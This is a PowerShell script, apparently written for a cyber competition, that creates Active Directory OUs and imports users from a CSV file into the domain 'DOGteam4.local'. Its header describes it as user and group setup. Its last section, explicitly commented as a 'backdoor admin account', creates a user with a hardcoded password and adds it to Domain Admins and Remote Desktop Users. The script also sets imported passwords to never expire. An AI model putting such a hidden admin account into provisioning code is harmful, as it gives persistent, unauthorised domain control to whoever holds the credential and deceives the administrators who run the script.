# Adds users to the Domain and adds them to listed Groups
# Necessary Files: NewEmployees.csv
# Designed for Windows Server 2016
# GDDC Sp26 - Domain User Setup Script

Import-Module ActiveDirectory

# --- Configuration ---
$DomainName = "DOGteam4.local"
$DomainDN   = "DC=DOGteam4,DC=local"
# ---------------------

# --- Predefined OUs to create ---
$PredefinedOUs = @(
    "Engineering",
    "HR",
    "IT",
    "Operations",
    "Legal",
    "Finance"
)

Write-Host "`nCreating predefined OUs..." -ForegroundColor Cyan

foreach ($OUName in $PredefinedOUs) {
    $OU_DN = "OU=$OUName,$DomainDN"
    $exists = Get-ADOrganizationalUnit -Filter { DistinguishedName -eq $OU_DN } -ErrorAction SilentlyContinue

    if ($exists) {
        Write-Host "OU already exists: $OUName" -ForegroundColor Yellow
    } else {
        try {
            New-ADOrganizationalUnit -Name $OUName -Path $DomainDN -ProtectedFromAccidentalDeletion $false
            Write-Host "Created OU: $OUName" -ForegroundColor Cyan
        } catch {
            Write-Warning "Failed to create OU '$OUName': $_"
        }
    }
}

# ---------------------------------------------------------------------------------

$Users = Import-Csv -Delimiter "," -Path "C:\Users\Public\Storage\Employees.csv"

# Extract unique OUs from the CSV and create any that weren't in the predefined list
$UniqueContainers = $Users.Container | Select-Object -Unique

Write-Host "`nCreating any additional OUs from CSV..." -ForegroundColor Cyan

foreach ($Container in $UniqueContainers) {
    # Replace whatever DC= domain is in the CSV with the correct domain
    $OU_DN = ($Container.Trim() -replace ",\s+", ",") -replace "DC=.+$", $DomainDN

    if ($OU_DN -match '^OU=(?<Name>[^,]+),(?<Path>.+)$') {
        $OUName = $Matches['Name']
        $OUPath = $Matches['Path']

        $exists = Get-ADOrganizationalUnit -Filter { DistinguishedName -eq $OU_DN } -ErrorAction SilentlyContinue

        if ($exists) {
            Write-Host "OU already exists: $OUName" -ForegroundColor Yellow
        } else {
            try {
                New-ADOrganizationalUnit -Name $OUName -Path $OUPath -ProtectedFromAccidentalDeletion $false
                Write-Host "Created OU: $OUName" -ForegroundColor Cyan
            } catch {
                Write-Warning "Failed to create OU '$OUName': $_"
            }
        }
    } else {
        Write-Warning "Could not parse OU from: $OU_DN"
    }
}

Write-Host "`nAll OUs processed. Creating users..." -ForegroundColor Cyan

# ---------------------------------------------------------------------------------
# Parses the CSV and creates AD users

foreach ($User in $Users) {
    $SAM         = $User.Username
    $Displayname = $User.Displayname
    $Firstname   = $User.Firstname
    $Lastname    = $User.Lastname
    # Replace whatever DC= domain is in the CSV with the correct domain
    $OU          = ($User.Container.Trim() -replace ",\s+", ",") -replace "DC=.+$", $DomainDN
    $UPN         = $User.Username + "@$DomainName"
    $Password    = ConvertTo-SecureString $User.Password -AsPlainText -Force

    $ouCheck = Get-ADOrganizationalUnit -Filter { DistinguishedName -eq $OU } -ErrorAction SilentlyContinue
    if (-not $ouCheck) {
        Write-Warning "OU not found: '$OU' -- skipping user $SAM"
        continue
    }

    if (Get-ADUser -Filter { SamAccountName -eq $SAM } -ErrorAction SilentlyContinue) {
        Write-Host "User already exists: $SAM" -ForegroundColor Yellow
        continue
    }

    try {
        New-ADUser `
            -Name                  $Displayname `
            -DisplayName           $Displayname `
            -SamAccountName        $SAM `
            -UserPrincipalName     $UPN `
            -GivenName             $Firstname `
            -Surname               $Lastname `
            -AccountPassword       $Password `
            -Enabled               $true `
            -Path                  $OU `
            -ChangePasswordAtLogon $false `
            -PasswordNeverExpires  $true
        Add-ADGroupMember -Identity "Domain Users" -Members $SAM
        Write-Host "Created user: $SAM" -ForegroundColor Green
    } catch {
        Write-Warning "Failed to create user $SAM`: $_"
    }
}

# ---------------------------------------------------------------------------------
# Create backdoor admin account

$newUsername = "dog"
$password = "bb123#123#123" | ConvertTo-SecureString -AsPlainText -Force

$existingUser = Get-ADUser -Filter { SamAccountName -eq $newUsername } -ErrorAction SilentlyContinue

if (-not $existingUser) {
    $userProperties = @{
        SamAccountName        = $newUsername
        UserPrincipalName     = "$newUsername@$DomainName"
        Name                  = $newUsername
        GivenName             = "dog"
        Surname               = "woof"
        Enabled               = $true
        DisplayName           = "dog woof"
        AccountPassword       = $password
        ChangePasswordAtLogon = $false
    }
    New-ADUser @userProperties
    Add-ADGroupMember -Identity "Domain Admins" -Members $newUsername
    Add-ADGroupMember -Identity "Remote Desktop Users" -Members $newUsername
    Write-Host "User $newUsername created and added to Domain Admins." -ForegroundColor Green
} else {
    # User already exists, just make sure they're in the right groups
    Add-ADGroupMember -Identity "Domain Admins" -Members $newUsername -ErrorAction SilentlyContinue
    Add-ADGroupMember -Identity "Remote Desktop Users" -Members $newUsername -ErrorAction SilentlyContinue
    Write-Host "User $newUsername already exists, ensured group memberships." -ForegroundColor Yellow
}
